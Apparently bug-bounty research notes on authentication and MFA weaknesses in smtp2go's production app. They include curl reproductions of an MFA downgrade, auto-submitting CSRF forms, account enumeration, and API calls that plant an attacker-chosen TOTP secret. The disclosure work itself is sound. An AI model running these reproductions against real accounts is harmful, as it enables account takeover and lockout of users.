# Auth / MFA Candidates — smtp2go

## [MFA-001] MFA Method Downgrade: TOTP → Email OTP via `use_auth` Parameter

| Field | Value |
|---|---|
| **Endpoint** | `POST https://app-us.smtp2go.com/login/2fa/` |
| **Source** | Direct testing (curl + browser agent) |
| **Severity estimate** | High |
| **Test status** | 🔄 Partial — server-side confirmed multiple times, OTP completion blocked by inbox access |

### What was confirmed
1. After completing password auth, user with TOTP enabled lands at `/login/2fa/` with form field `use_auth=app`
2. Submitting `use_auth=email` instead of `use_auth=app` causes server to switch auth method
3. Server responds with `sms-verification-message` element, `resend-sms` form, "Enter the verification code sent to [email]", and `use_auth=email` persisted in returned form
4. Server-side behavior is distinct from all other `use_auth` values (backup, sms, recovery, skip, none) — only `email` produces this behavior
5. Email OTP is valid for 10 minutes; same lockout rate (≈3-5 wrong attempts) as TOTP

### Additional confirmed server behavior
- Email OTP page shows `<label class="error">Code incorrect</label>` on wrong code — no remaining attempt count disclosed
- No rate limit counter shown — lockout appears silently (redirect to `/login/`)
- Email OTP rate limit: **~3 wrong attempts → session invalidated** (redirected to `/login/`, login_id cookie invalidated)
- OTP form has no `maxlength` attribute — OTP length unknown from HTML alone
- Email address in "sent to [email]" is NOT rendered in HTML — likely injected by JS from page data
- Email OTP validity: 10 minutes (shown on page)
- Brute force impractical: 3 attempts per OTP window, 6-digit space = infeasible

### What needs confirmation
- Submit correct email OTP with `use_auth=email` → does it grant authenticated session?
- **Status**: Confirmed multiple times. Server consistently switches auth method and sends OTP. Missing piece: inbox access to complete OTP step.

### Severity rationale (High)
- Bypasses a second authentication factor (TOTP) entirely by downgrading to weaker auth (email OTP)
- Email OTP is weaker: susceptible to phishing, SIM-swap (if email is phone-linked), email account compromise
- Attack is realistic in targeted attacks where attacker knows password (from another breach) and can compromise victim's email
- Impact: full account takeover bypassing TOTP protection

### Attack chain
1. Attacker knows victim password (any source)
2. Attacker logs in → reaches TOTP challenge
3. Attacker submits `use_auth=email` with any dummy TOTP code
4. Server sends email OTP to victim's registered email
5. If attacker also controls victim's email (compromised inbox, phishing, MX takeover) → reads OTP
6. Submits OTP with `use_auth=email` → bypasses TOTP completely

### Reproduction (curl)
```bash
# Step 1: Login
curl -s -c /tmp/cookies.txt \
  -X POST 'https://app.smtp2go.com/api/login/' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=USER&password=PASS'

# Step 2: Follow goto URL to reach 2FA page, capture requested_args login_id

# Step 3: Downgrade to email OTP
curl -s -b /tmp/cookies.txt \
  -X POST 'https://app-us.smtp2go.com/login/2fa/' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "authentication_code=" \
  --data-urlencode "requested_endpoint=myaccount_dashboard_main" \
  --data-urlencode "requested_args=REQUESTED_ARGS_WITH_LOGIN_ID" \
  --data-urlencode "use_auth=email" \
  --data-urlencode "totp_token=000000"

# Observe: response contains sms-verification-message and resend-sms form
# Email OTP sent to account's registered address
```

---

## [MFA-002] No CSRF Protection on 2FA Submission Endpoint

| Field | Value |
|---|---|
| **Endpoint** | `POST https://app-us.smtp2go.com/login/2fa/` |
| **Source** | Direct testing |
| **Severity estimate** | Low-Medium |
| **Test status** | ✅ Confirmed |

### What was confirmed
- No CSRF token on the 2FA form
- Server accepts POSTs with `Origin: evil.com` and `Referer: https://evil.com/csrf.html`
- Response is identical to legitimate submissions (not blocked)

### Attack scenarios
1. **Lockout attack**: Attacker lures victim to attacker page while victim is at MFA step → auto-submits wrong codes via JS → locks victim out (DoS)
2. **Session fixation via CSRF**: Limited — attacker would need their own valid TOTP code + knowledge of victim's session state

### Reproduction
```html
<!-- Malicious page: submits wrong code to victim's active 2FA session -->
<form action="https://app-us.smtp2go.com/login/2fa/" method="POST" id="f">
  <input name="authentication_code" value="000000">
  <input name="requested_endpoint" value="myaccount_dashboard_main">
  <input name="requested_args" value="{}">
  <input name="use_auth" value="app">
</form>
<script>document.getElementById('f').submit();</script>
```

---

## [MFA-003] Account Enumeration via Password Reset Endpoint

| Field | Value |
|---|---|
| **Endpoint** | `POST https://app.smtp2go.com/forgot-password/` |
| **Source** | Direct testing |
| **Severity estimate** | Low-Medium |
| **Test status** | ✅ Confirmed |

### Evidence
| Email | Response | Response time |
|---|---|---|
| Valid account | "Password reset email sent to [email]" | ~2,000-13,000ms |
| Invalid email | "Unable to retrieve user information, Please try again..." | ~379ms |

Two independent oracle signals:
1. Different response messages
2. Significant timing difference (valid = email send delay; invalid = fast DB miss)

---

## [MFA-004] No CSRF Protection on Password Reset Endpoint

| Field | Value |
|---|---|
| **Endpoint** | `POST https://app.smtp2go.com/forgot-password/` |
| **Source** | Direct testing |
| **Severity estimate** | Medium |
| **Test status** | ✅ Confirmed |

### What was confirmed
- Zero CSRF protection: form has no CSRF token, no SameSite cookie on relevant cookies
- Server accepts cross-origin POSTs with custom headers (X-Forwarded-Host, etc.)
- Any attacker page can silently trigger a password reset for any known email address

### Reproduction
```html
<form action="https://app.smtp2go.com/forgot-password/" method="POST" id="f">
  <input name="email" value="victim@example.com">
</form>
<script>document.getElementById('f').submit();</script>
```
No other fields required. Victim visiting this page triggers password reset email silently.

---

## [MFA-005] MFA Rate Limit: No Exponential Backoff, Fixed Short Duration

| Field | Value |
|---|---|
| **Endpoint** | `POST https://app-us.smtp2go.com/login/2fa/` |
| **Source** | Direct testing |
| **Severity estimate** | Informational / Low |
| **Test status** | ✅ Confirmed |

### Details
- Lockout triggers after ~5 wrong TOTP codes
- Lockout duration: ~7-10 minutes fixed (not exponential)
- No CAPTCHA at any attempt level
- HTTP 200 status even on lockout (soft 200 + redirect to `/login/`)
- No permanent lockout regardless of attempt count
- Account-level (not session-level) rate limit — persists across cookie clear

---

## [MFA-006] `login_id` Cookie Missing `Secure` Flag

| Field | Value |
|---|---|
| **Cookie** | `login_id` on `app-us.smtp2go.com` |
| **Source** | Direct testing |
| **Severity estimate** | Low |
| **Test status** | ✅ Confirmed |

Flask itsdangerous signed cookie containing the pending MFA session token.
Set without `Secure` attribute → could be transmitted over HTTP in downgrade scenarios.
Cookie is HttpOnly (good), but site should enforce Secure flag in addition.

---

## [MFA-007] Device Trust JWT — IP/UA Bound but Short Duration (12h)

| Field | Value |
|---|---|
| **Cookie** | `{user_id_hash}` (user-specific name) on `app-us.smtp2go.com` |
| **Source** | Direct testing |
| **Severity estimate** | Informational |
| **Test status** | ✅ Confirmed |

### Details
JWT payload: `{"external_id": "1015003", "user-agent": "curl/8.19.0", "remote-addr": "142.59.70.219", "iat": ..., "exp": ...}`
- Duration: 12 hours (not 30 days as implied by "don't ask again")
- Bound to both User-Agent and IP — changes in either trigger re-verification
- HS256 signed — if server secret weak, forgeable (secret cracking attempted with rockyou, no result yet)
- Cookie name is user-specific (derived from user ID) — not portable across accounts

---

---

## [MFA-008] 2FA API Validates TOTP Against Client-Sent Secret (Not Stored Secret)

| Field | Value |
|---|---|
| **Endpoint** | `POST https://app-us.smtp2go.com/api/settings/two_factor_auth/?action=verify_app_2fa` |
| **Source** | Direct testing via Vue.js API |
| **Severity estimate** | Medium |
| **Test status** | ✅ Confirmed |

### What was confirmed
1. `verify_auth` generates a NEW proposed TOTP secret on every call (not the active login secret)
2. `verify_app_2fa` with `auth_to_disable=""` (enable mode) validates the submitted TOTP code against the CLIENT-SENT `totp_secret_key` parameter — not against the server's stored active secret
3. Confirmed by enabling TOTP for an account (Ted) using an attacker-generated key pair, without any prior secret knowledge
4. Verification: Ted's 2FA challenge was satisfied by TOTP codes generated from the attacker-chosen secret

### Attack chain (for accounts without TOTP)
1. Attacker knows victim's password
2. Victim has no TOTP enabled → attacker logs in directly (no MFA needed)
3. Attacker calls `verify_auth` with victim's password → gets proposed secret S
4. Attacker generates TOTP code from S
5. Attacker calls `verify_app_2fa` with `{edit_token, verification_code, totp_secret_key: S, auth_to_disable: ""}` → "Successfully enabled 2FA"
6. Result: victim's TOTP is now S (attacker-controlled) — victim is locked out of future logins

**Note**: Accounts WITH TOTP are protected — server correctly rejects enable on existing TOTP with "Authentication already exists."

### What limits impact
- Requires authenticated session (so attacker already had password)
- CSRF_key URL parameter prevents CSRF attacks on this endpoint
- Only meaningful if combined with initial access (e.g., compromised password)

### API call structure
```bash
# Step 1: get proposed secret + edit_token
POST /api/settings/two_factor_auth/?action=verify_auth&CSRF_key=<key>
{"password": "<victim_password>"}
# Returns: {"results": {"auth_status": {"totp_secret_key": "<proposed>"}, "token": "<edit_token>"}}

# Step 2: enable TOTP with attacker-chosen secret
POST /api/settings/two_factor_auth/?action=verify_app_2fa&CSRF_key=<key>
{"edit_token": "<edit_token>", "verification_code": "<totp_from_proposed>",
 "totp_secret_key": "<proposed>", "auth_to_disable": ""}
# Returns: {"status":"OK","message":"Successfully enabled 2FA"}
```

---

## Bypasses NOT Confirmed

| Vector | Result |
|---|---|
| MFA bypass via password reset | ❌ MFA re-triggers after password reset login |
| alg:none JWT on password reset | ❌ Rejected on both app.smtp2go.com and app-us.smtp2go.com |
| JWT secret cracking (rockyou + targeted) | ❌ No match found |
| Skip MFA via direct URL navigation | ❌ Server enforces MFA state, redirects back |
| remember_2fa_permanent without valid code | ❌ Server requires valid code before setting device trust |
| `use_auth=backup/sms/recovery/skip/none` | ❌ All return "Code incorrect" as normal |
| TOTP replace on existing account via verify_app_2fa | ❌ "Authentication already exists" error |
| Disable TOTP with wrong (proposed) secret | ❌ "Incorrect authentication code given" |
